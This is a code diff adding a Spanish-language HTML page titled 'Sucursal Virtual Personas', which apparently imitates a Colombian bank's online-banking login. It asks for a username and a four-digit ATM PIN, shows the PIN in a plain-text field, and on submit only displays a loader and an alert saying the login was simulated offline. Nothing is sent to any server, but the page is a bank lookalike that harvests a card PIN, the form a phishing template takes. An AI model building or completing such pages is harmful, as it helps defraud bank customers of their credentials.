@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="es-CO">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Sucursal Virtual Personas</title>
+
+    <style>
+        /* Reset y base */
+        *, *:after, *:before {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-yellow: #fdda24;
+            --primary-blue: #0033a0;
+            --cyan-blue: #00bcd4;
+            --text-dark: #2c2a29;
+            --text-light: #b0b0b0;
+            --bg-dark: #3a3a3a;
+            --card-dark: #4a4a4a;
+            --white: #ffffff;
+            --error-red: #ff5252;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", sans-serif;
+            background: linear-gradient(135deg, #2d2d2d 0%, #1a1a1a 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: var(--white);
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before, body::after {
+            content: '';
+            position: fixed;
+            border-radius: 50%;
+            z-index: 0;
+        }
+
+        body::before {
+            width: 300px;
+            height: 300px;
+            background: linear-gradient(135deg, #fdda24 0%, #ffa726 100%);
+            bottom: -150px;
+            right: -150px;
+            opacity: 0.3;
+        }
+
+        body::after {
+            width: 200px;
+            height: 200px;
+            background: linear-gradient(135deg, #7c4dff 0%, #9c27b0 100%);
+            top: 100px;
+            left: -100px;
+            opacity: 0.3;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 1rem;
+            position: relative;
+            z-index: 1;
+            flex: 1;
+        }
+/* Logo centrado arriba del letrero */
+.banner-logo-top {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 1rem; /* espacio entre logo y banner */
+}
+
+.banner-logo-top img {
+    max-width: 240px;  /* tamaño máximo */
+    width: 100%;
+    height: auto;
+    display: block;
+}
+
+.info-banner {
+    display: flex;
+    background: #ffffff; /* fondo blanco total */
+    border-radius: 12px;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.15);
+    overflow: hidden;
+    max-width: 600px;
+    margin: 1rem auto 2rem auto;
+}
+
+/* Banner estilo tarjeta */
+.info-banner-icon {
+    width: 24px;
+    height: 24px;
+}
+
+.input-wrapper .icon {
+    width: 24px;
+    height: 24px;
+    margin-right: 1rem;
+}
+
+
+.info-banner-icon-wrapper {
+    background: #5a8fe3; /* azul lateral */
+    padding: 1rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-width: 60px;
+}
+
+.info-banner-icon {
+    font-size: 1.5rem;
+}
+
+.info-banner-content {
+    padding: 0.5rem 1rem; /* menos espacio arriba y abajo */
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    background: #ffffff; /* fondo blanco */
+    border-radius: 0 12px 12px 0;
+}
+
+.info-banner-content h2 {
+    font-size: 1rem; /* más pequeño */
+    font-weight: 700;
+    color: #003366; /* azul tenue */
+    margin: 0 0 0.25rem 0; /* menos margen arriba */
+}
+
+.info-banner-content p {
+    font-size: 0.85rem; /* un poco más pequeño */
+    color: #5a8fe3; /* azul más claro */
+    margin: 0 0 0.5rem 0; /* menos margen arriba */
+}
+
+.info-banner-link {
+    font-size: 0.85rem; /* más pequeño */
+    color: #5a8fe3;
+    text-decoration: underline;
+    font-weight: 600;
+}
+
+
+
+
+        .info-banner-link:hover {
+            opacity: 0.8;
+        }
+
+        /* Card de autenticación */
+        .auth-card {
+            background: var(--card-dark);
+            border-radius: 20px;
+            padding: 2.5rem 2rem;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
+            margin-top: 2rem;
+        }
+
+        .auth-card h1 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: var(--white);
+            text-align: center;
+        }
+
+        .auth-card h3 {
+            font-size: 1rem;
+            font-weight: 400;
+            color: var(--text-light);
+            margin-bottom: 2.5rem;
+            text-align: center;
+        }
+
+        .form-field {
+            margin-bottom: 1.8rem;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+            background: transparent;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.3);
+            transition: border-color 0.3s ease;
+        }
+
+        .input-wrapper:focus-within {
+            border-bottom-color: var(--primary-yellow);
+        }
+
+        .input-wrapper.error {
+            border-bottom-color: var(--error-red);
+        }
+
+        .input-wrapper .icon {
+            color: var(--text-light);
+            font-size: 1.4rem;
+            margin-right: 1rem;
+        }
+
+        .input-wrapper input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 1rem 0;
+            font-size: 1rem;
+            color: var(--white);
+            outline: none;
+        }
+
+        .helper-text {
+            display: block;
+            margin-top: 0.5rem;
+            font-size: 0.875rem;
+            min-height: 1.2rem;
+            transition: all 0.3s;
+        }
+
+        .helper-text.error {
+            color: var(--error-red);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 1.1rem;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 1.5rem 0 1rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #7a7a7a 0%, #5a5a5a 100%);
+            color: rgba(255, 255, 255, 0.5);
+            cursor: not-allowed;
+        }
+
+        .btn-primary:not(:disabled) {
+            background: linear-gradient(135deg, #b0b0b0 0%, #909090 100%);
+            color: var(--text-dark);
+            cursor: pointer;
+        }
+
+        .btn-primary:not(:disabled):hover {
+            background: linear-gradient(135deg, #c0c0c0 0%, #a0a0a0 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .loader {
+            display: none;
+            text-align: center;
+            padding: 2rem;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.95);
+            border-radius: 16px;
+            z-index: 1000;
+            min-width: 200px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(10px);
+        }
+
+        .loader.active {
+            display: block;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid var(--primary-yellow);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1rem;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+footer {
+    background: rgba(0, 0, 0, 0);
+    padding: 0; /* sin padding */
+    margin: 0;
+    position: relative;
+    width: 100%;
+    text-align: center;
+    border: none;
+}
+.footer-links {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 1.5rem;
+    justify-content: center;
+    margin-bottom: 1.5rem;
+}
+
+.footer-link {
+    color: var(--white);
+    text-decoration: none;
+    font-size: 0.875rem;
+    opacity: 0.8;
+    transition: all 0.3s;
+    position: relative;
+}
+
+.footer-link::after {
+    content: '';
+    position: absolute;
+    bottom: -2px;
+    left: 0;
+    width: 0;
+    height: 2px;
+    background: var(--primary-yellow);
+    transition: width 0.3s;
+}
+
+.footer-link:hover {
+    opacity: 0;
+}
+
+.footer-link:hover::after {
+    width: 100%;
+}
+
+.footer-bottom {
+    display: flex;
+    justify-content: center; /* centrar en vez de space-between */
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 1rem;
+    padding-top: 1.5rem;
+    border-top: none; /* quitar borde superior */
+}
+
+
+.footer-image-wrapper {
+    display: flex;
+    justify-content: center;
+    align-items: flex-end; /* pegar al final */
+    width: 100%;
+}
+
+.footer-image-wrapper img {
+    width: 100%;      /* ocupar todo el ancho */
+    max-width: none;  /* sin límite */
+    height: auto;     /* mantener proporción */
+    display: block;
+}
+
+
+    </style>
+</head>
+
+<body>
+    <main class="container">
+        <!-- Banner informativo -->
+<!-- Logo centrado arriba del letrero -->
+<div class="banner-logo-top">
+    <img src="logo.png" alt="Logo">
+</div>
+
+<!-- Banner informativo -->
+<section class="info-banner">
+    <div class="info-banner-icon-wrapper">
+        <img src="icon-notification.png" alt="Notificación" class="info-banner-icon">
+    </div>
+    <div class="info-banner-content">
+        <h2>¡Prográmate!</h2>
+        <p>Consulta el estado de nuestros canales y los mantenimientos programados.</p>
+        <a href="#info" class="info-banner-link">Más info aquí.</a>
+    </div>
+</section>
+
+<!-- Card de autenticación -->
+<section class="auth-card">
+    <h1>¡Hola!</h1>
+    <h3>Ingresa los datos para gestionar tus productos y hacer transacciones.</h3>
+
+    <form id="loginForm" novalidate>
+        <div class="form-field">
+            <div class="input-wrapper" id="usernameWrapper">
+                <img src="icon-user.png" alt="Usuario" class="icon">
+                <input type="text" id="username" placeholder="Usuario" maxlength="20" required>
+            </div>
+            <span class="helper-text" id="usernameHelper">Ingresa tu usuario</span>
+        </div>
+
+        <div class="form-field">
+            <div class="input-wrapper" id="passwordWrapper">
+                <img src="icon-lock.png" alt="Clave" class="icon">
+                <input type="text" id="password" placeholder="Clave del cajero" maxlength="4" inputmode="numeric" required>
+            </div>
+            <span class="helper-text" id="passwordHelper"></span>
+        </div>
+
+        <button type="submit" class="btn btn-primary" id="loginBtn" disabled>Iniciar sesión</button>
+    </form>
+</section>
+    </main>
+
+<footer>
+    <div class="footer-image-wrapper">
+        <img src="foot.png" alt="Footer">
+    </div>
+</footer>
+
+
+    <div class="loader" id="loader">
+        <div class="spinner"></div>
+        <p>Cargando...</p>
+    </div>
+
+    <script>
+        'use strict';
+        const username = document.getElementById('username');
+        const password = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const loader = document.getElementById('loader');
+        const usernameWrapper = document.getElementById('usernameWrapper');
+        const passwordWrapper = document.getElementById('passwordWrapper');
+        const usernameHelper = document.getElementById('usernameHelper');
+        const passwordHelper = document.getElementById('passwordHelper');
+
+        function validateForm() {
+            const isUsernameValid = username.value.trim().length > 0;
+            const isPasswordValid = password.value.length === 4;
+            loginBtn.disabled = !(isUsernameValid && isPasswordValid);
+            updateField(username, usernameWrapper, usernameHelper, isUsernameValid, "Ingresa tu usuario");
+            updateField(password, passwordWrapper, passwordHelper, isPasswordValid, "La clave debe tener 4 dígitos");
+        }
+
+        function updateField(input, wrapper, helper, valid, errorMsg) {
+            if (input.value.length > 0 && !valid) {
+                wrapper.classList.add('error');
+                helper.textContent = errorMsg;
+                helper.classList.add('error');
+            } else {
+                wrapper.classList.remove('error');
+                helper.textContent = '';
+                helper.classList.remove('error');
+            }
+        }
+
+        username.addEventListener('input', () => {
+            username.value = username.value.replace(/[^a-zA-Z0-9]/g, '');
+            validateForm();
+        });
+
+        password.addEventListener('input', () => {
+            password.value = password.value.replace(/[^0-9]/g, '');
+            validateForm();
+        });
+
+        document.getElementById('loginForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            if (!loginBtn.disabled) {
+                loader.classList.add('active');
+                setTimeout(() => {
+                    loader.classList.remove('active');
+                    alert('Login simulado exitosamente (offline)');
+                }, 1500);
+            }
+        });
+    </script>
+</body>
+</html>
